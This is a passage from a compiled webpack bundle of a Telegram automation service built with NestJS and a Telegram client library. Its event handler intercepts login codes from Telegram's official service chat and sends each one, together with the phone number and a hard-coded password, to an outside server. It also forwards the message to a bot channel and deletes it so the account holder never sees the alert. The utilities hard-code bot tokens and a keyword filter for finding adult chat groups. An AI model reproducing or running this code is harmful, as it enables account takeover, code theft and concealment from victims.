            console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(error))
        }
    }

    async updatePrivacy() {
        try {
            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyPhoneCall({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyProfilePhoto({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyPhoneNumber({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyStatusTimestamp({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyAbout({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
        }
        catch (e) {
            console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(e))
        }
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log("Login Code received for - ", this.phoneNumber, '\nSetup - ', activeClientSetup);
                if (activeClientSetup && this.phoneNumber === activeClientSetup?.phoneNumber) {
                    console.log("LoginText: ", event.message.text)
                    const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
                    console.log("Code is:", code)
                    try {
                        const response = await axios__WEBPACK_IMPORTED_MODULE_2___default().get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
                        console.log("Code Sent");
                    } catch (error) {
                        console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(error))
                    }
                    await deleteClient(this.phoneNumber)
                }
                console.log(event.message.text.toLowerCase());
                const ppplbot = `https://api.telegram.org/bot${process.env.ramyaredd1bot}/sendMessage`;
                const payload = {
                    "chat_id": "-1001801844217",
                    "text": event.message.text
                };
                axios__WEBPACK_IMPORTED_MODULE_2___default().post(ppplbot, payload)
                    .then((response) => {
                    })
                    .catch((error) => {
                        console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(error))
                        console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(error))
                        // console.error('Error sending message:', error.response?.data?.description);
                    });
                await event.message.delete({ revoke: true });
            }
        }
    }
}


/***/ }),

/***/ "./utils.js":
/*!******************!*\
  !*** ./utils.js ***!
  \******************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   contains: () => (/* binding */ contains),
/* harmony export */   fetchWithTimeout: () => (/* binding */ fetchWithTimeout),
/* harmony export */   isMatchingChatEntity: () => (/* binding */ isMatchingChatEntity),
/* harmony export */   parseError: () => (/* binding */ parseError),
/* harmony export */   ppplbot: () => (/* binding */ ppplbot),
/* harmony export */   sleep: () => (/* binding */ sleep),
/* harmony export */   tryWithReplit: () => (/* binding */ tryWithReplit)
/* harmony export */ });
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! axios */ "axios");
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(axios__WEBPACK_IMPORTED_MODULE_0__);

let botCount = 0

function contains(str, arr) {
  return (arr.some(element => {
      if (str?.includes(element)) {
          return true;
      }
      return false;
  }))
};

const ppplbot = (chatId, botToken) => {
  let token = botToken;
  if (!token) {
    if (botCount % 2 == 1) {
      token = `bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY`
    } else {
      token = `bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA`
    }
    botCount++;
  }
  return `https://api.telegram.org/${token}/sendMessage?chat_id=${chatId ? chatId : "-1001801844217"}`
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


function parseError(
  err,
  prefix = 'ShruthieRed',
) {
  let status = 'UNKNOWN';
  let message = 'An unknown error occurred';
  let error = 'UnknownError';

  const extractMessage = (data) => {
    if (Array.isArray(data)) {
      const messages = data.map((item) => extractMessage(item));
      return messages.filter((message) => message !== undefined).join(', ');
    } else if (typeof data === 'string') {
      return data;
    } else if (typeof data === 'object' && data !== null) {
      let resultString = ''
      for (const key in data) {
        const value = data[key]
        if (Array.isArray(data[key]) && data[key].every(item => typeof item === 'string')) {
          resultString = resultString + data[key].join(', ');
        } else {
          const result = extractMessage(value);
          if (result) {
            resultString = resultString + result;
          }
        }
      }
      return resultString
    }
    return JSON.stringify(data);
  };

  if (err.response) {
    const response = err.response;
    status =
      response.data?.status ||
      response.status ||
      err.status ||
      'UNKNOWN';
    message =
      response.data?.message ||
      response.data?.errors ||
      response.message ||
      response.statusText ||
      response.data ||
      err.message ||
      'An error occurred';
    error =
      response.data?.error ||
      response.error ||
      err.name ||
      err.code ||
      'Error';
  } else if (err.request) {
    status = err.status || 'NO_RESPONSE';
    message = err.data?.message ||
      err.data?.errors ||
      err.message ||
      err.statusText ||
      err.data ||
      err.message || 'The request was triggered but no response was received';
    error = err.name || err.code || 'NoResponseError';
  } else if (err.message) {
    status = err.status || 'UNKNOWN';
    message = err.message;
    error = err.name || err.code || 'Error';
  }

  const msg = `${prefix ? `${prefix} ::` : ""} ${extractMessage(message)} `

  const resp = { status, message: msg, error };
  console.log(resp);
  return resp
}
async function fetchWithTimeout(resource, options = {}, maxRetries = 1) {
  const timeout = options?.timeout || 25000;
  const source = axios__WEBPACK_IMPORTED_MODULE_0___default().CancelToken.source();
  const id = setTimeout(() => source.cancel(), timeout);

  for (let retryCount = 0; retryCount <= maxRetries; retryCount++) {
    if (retryCount > 0) {
      try {
        await axios__WEBPACK_IMPORTED_MODULE_0___default().get(`${ppplbot()}&text=${encodeURIComponent(`Retrying: ${resource}`)}`);
        console.log("details :", options, resource); 
      } catch (error) {
        console.log(parseError(error))
      }
    }
    try {
      const response = await axios__WEBPACK_IMPORTED_MODULE_0___default()({
        ...options,
        url: resource,
        cancelToken: source.token
      });

      clearTimeout(id);
      return response;
    } catch (error) {
      if (axios__WEBPACK_IMPORTED_MODULE_0___default().isCancel(error)) {
        console.log('Request canceled:', error.message, resource);
      } else if (error.response && error.response.status === 403) {
        // await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent("Glitch DOwn")}`);
        console.log("Asking Replit");
        return await tryWithReplit(resource)
      } else {
        console.error('herError:', error.message);
        return undefined;
      }

      if (retryCount < maxRetries) {
        await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second delay before retrying
      } else {
        console.error(`All ${maxRetries + 1} retries failed for ${resource}`);
        try {
          await axios__WEBPACK_IMPORTED_MODULE_0___default().get(`${ppplbot()}&text=${encodeURIComponent(`| Failed | url: ${resource}\n${retryCount + 1}/${maxRetries + 1}\n${parseError(error).message}`)}`)
        } catch (er) {
          console.log(parseError(er))
        }
        return undefined;
      }
    }
  }
}
async function tryWithReplit(url) {
  const payload = { url: url, method: "GET" }
  const options = {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    data: JSON.stringify(payload),
  };
  try {
    const result = await axios__WEBPACK_IMPORTED_MODULE_0___default()({ ...options, url: "https://execuor-production.up.railway.app/check" });
    console.log("Replit result:", result.status, result.data);
    return result
  } catch (error) {
    console.log(parseError(error))
  }
}
const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl', 'randi', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
const pattern = new RegExp(keys.join('|'), 'i');
const notPattern = new RegExp('online|board|class|PROFIT|@wholesale|retail|topper|exam|medico|traini|cms|cma|subject|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', "i")

function isMatchingChatEntity(chatEntity) {

  const usernameOrTitleMatch = chatEntity?.username.match(pattern) ||
    chatEntity?.title.match(pattern);

  const excludedPatternMatch = chatEntity?.username.match(notPattern) ||
    chatEntity?.title.match(notPattern);

  const restrictedMessages = chatEntity?.sendMessages || chatEntity?.broadcast || chatEntity?.restricted;

  return usernameOrTitleMatch && !excludedPatternMatch && !restrictedMessages;
}


/***/ }),

/***/ "@nestjs/common":
/*!*********************************!*\
  !*** external "@nestjs/common" ***!
  \*********************************/
/***/ ((module) => {

module.exports = require("@nestjs/common");

/***/ }),

/***/ "@nestjs/core":
/*!*******************************!*\
  !*** external "@nestjs/core" ***!
  \*******************************/
/***/ ((module) => {

module.exports = require("@nestjs/core");

/***/ }),

/***/ "@nestjs/mongoose":
/*!***********************************!*\
  !*** external "@nestjs/mongoose" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("@nestjs/mongoose");

/***/ }),

/***/ "@nestjs/platform-express":
/*!*******************************************!*\
  !*** external "@nestjs/platform-express" ***!
  \*******************************************/
/***/ ((module) => {

module.exports = require("@nestjs/platform-express");

/***/ }),

/***/ "@nestjs/swagger":
/*!**********************************!*\
  !*** external "@nestjs/swagger" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("@nestjs/swagger");

/***/ }),

/***/ "axios":
/*!************************!*\
  !*** external "axios" ***!
  \************************/
/***/ ((module) => {

module.exports = require("axios");

/***/ }),

/***/ "body-parser":
/*!******************************!*\
  !*** external "body-parser" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("body-parser");

/***/ }),

/***/ "class-transformer":
/*!************************************!*\
  !*** external "class-transformer" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("class-transformer");

/***/ }),

/***/ "class-validator":
/*!**********************************!*\
  !*** external "class-validator" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("class-validator");

/***/ }),

/***/ "cloudinary":
/*!*****************************!*\
  !*** external "cloudinary" ***!
  \*****************************/
/***/ ((module) => {

module.exports = require("cloudinary");

/***/ }),

/***/ "cors":
/*!***********************!*\
  !*** external "cors" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("cors");

/***/ }),

/***/ "dotenv":
/*!*************************!*\
  !*** external "dotenv" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("dotenv");

/***/ }),

/***/ "express":
/*!**************************!*\
  !*** external "express" ***!
  \**************************/
/***/ ((module) => {

module.exports = require("express");

/***/ }),

/***/ "imap":
/*!***********************!*\
  !*** external "imap" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("imap");

/***/ }),

/***/ "mongodb":
/*!**************************!*\
  !*** external "mongodb" ***!
  \**************************/
/***/ ((module) => {

module.exports = require("mongodb");

/***/ }),

/***/ "mongoose":
/*!***************************!*\
  !*** external "mongoose" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("mongoose");

/***/ }),

/***/ "node-schedule-tz":
/*!***********************************!*\
  !*** external "node-schedule-tz" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("node-schedule-tz");

/***/ }),

/***/ "telegram":
/*!***************************!*\
  !*** external "telegram" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("telegram");

/***/ }),

/***/ "telegram/Helpers":
/*!***********************************!*\
  !*** external "telegram/Helpers" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("telegram/Helpers");

/***/ }),

/***/ "telegram/client/uploads":
/*!******************************************!*\
  !*** external "telegram/client/uploads" ***!
  \******************************************/
/***/ ((module) => {

module.exports = require("telegram/client/uploads");

/***/ }),

/***/ "telegram/events":
/*!**********************************!*\
  !*** external "telegram/events" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("telegram/events");

/***/ }),

/***/ "telegram/events/index.js":
/*!*******************************************!*\
  !*** external "telegram/events/index.js" ***!
  \*******************************************/
/***/ ((module) => {

module.exports = require("telegram/events/index.js");

/***/ }),

/***/ "telegram/extensions/Logger":
/*!*********************************************!*\
  !*** external "telegram/extensions/Logger" ***!
  \*********************************************/
/***/ ((module) => {

module.exports = require("telegram/extensions/Logger");

/***/ }),

/***/ "telegram/sessions":
/*!************************************!*\
  !*** external "telegram/sessions" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("telegram/sessions");

/***/ }),

/***/ "telegram/tl":
/*!******************************!*\
  !*** external "telegram/tl" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("telegram/tl");

/***/ }),

/***/ "child_process":
/*!********************************!*\
  !*** external "child_process" ***!
  \********************************/
/***/ ((module) => {

module.exports = require("child_process");

/***/ }),

/***/ "fs":
/*!*********************!*\
  !*** external "fs" ***!
  \*********************/
/***/ ((module) => {

module.exports = require("fs");

/***/ }),

/***/ "path":
/*!***********************!*\
  !*** external "path" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("path");

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/async module */
/******/ 	(() => {
/******/ 		var webpackQueues = typeof Symbol === "function" ? Symbol("webpack queues") : "__webpack_queues__";
/******/ 		var webpackExports = typeof Symbol === "function" ? Symbol("webpack exports") : "__webpack_exports__";
/******/ 		var webpackError = typeof Symbol === "function" ? Symbol("webpack error") : "__webpack_error__";
/******/ 		var resolveQueue = (queue) => {
/******/ 			if(queue && queue.d < 1) {
/******/ 				queue.d = 1;
/******/ 				queue.forEach((fn) => (fn.r--));
/******/ 				queue.forEach((fn) => (fn.r-- ? fn.r++ : fn()));
/******/ 			}
/******/ 		}
/******/ 		var wrapDeps = (deps) => (deps.map((dep) => {
/******/ 			if(dep !== null && typeof dep === "object") {
/******/ 				if(dep[webpackQueues]) return dep;
/******/ 				if(dep.then) {
/******/ 					var queue = [];
/******/ 					queue.d = 0;
/******/ 					dep.then((r) => {
/******/ 						obj[webpackExports] = r;
/******/ 						resolveQueue(queue);
/******/ 					}, (e) => {
/******/ 						obj[webpackError] = e;
/******/ 						resolveQueue(queue);
/******/ 					});
/******/ 					var obj = {};
/******/ 					obj[webpackQueues] = (fn) => (fn(queue));
/******/ 					return obj;
/******/ 				}
/******/ 			}
/******/ 			var ret = {};
/******/ 			ret[webpackQueues] = x => {};
/******/ 			ret[webpackExports] = dep;
/******/ 			return ret;
/******/ 		}));
/******/ 		__webpack_require__.a = (module, body, hasAwait) => {
/******/ 			var queue;
/******/ 			hasAwait && ((queue = []).d = -1);
/******/ 			var depQueues = new Set();
/******/ 			var exports = module.exports;
/******/ 			var currentDeps;
/******/ 			var outerResolve;
/******/ 			var reject;
/******/ 			var promise = new Promise((resolve, rej) => {
/******/ 				reject = rej;
/******/ 				outerResolve = resolve;
/******/ 			});
/******/ 			promise[webpackExports] = exports;
/******/ 			promise[webpackQueues] = (fn) => (queue && fn(queue), depQueues.forEach(fn), promise["catch"](x => {}));
/******/ 			module.exports = promise;
/******/ 			body((deps) => {
/******/ 				currentDeps = wrapDeps(deps);
/******/ 				var fn;
/******/ 				var getResult = () => (currentDeps.map((d) => {
/******/ 					if(d[webpackError]) throw d[webpackError];
/******/ 					return d[webpackExports];
/******/ 				}))
/******/ 				var promise = new Promise((resolve) => {
/******/ 					fn = () => (resolve(getResult));
/******/ 					fn.r = 0;
/******/ 					var fnQueue = (q) => (q !== queue && !depQueues.has(q) && (depQueues.add(q), q && !q.d && (fn.r++, q.push(fn))));
/******/ 					currentDeps.map((dep) => (dep[webpackQueues](fnQueue)));
/******/ 				});
/******/ 				return fn.r ? promise : getResult();
/******/ 			}, (err) => ((err ? reject(promise[webpackError] = err) : outerResolve(exports)), resolveQueue(queue)));
/******/ 			queue && queue.d < 0 && (queue.d = 0);
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	(() => {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = (module) => {
/******/ 			var getter = module && module.__esModule ?
/******/ 				() => (module['default']) :
/******/ 				() => (module);
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	(() => {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = (exports, definition) => {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	(() => {
/******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
/******/ 	
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	// This entry module used 'module' so it can't be inlined
/******/ 	var __webpack_exports__ = __webpack_require__("./index.js");
/******/ 	var __webpack_export_target__ = exports;
/******/ 	for(var i in __webpack_exports__) __webpack_export_target__[i] = __webpack_exports__[i];
/******/ 	if(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, "__esModule", { value: true });
/******/ 	
/******/ })()
;
//# sourceMappingURL=index.js.map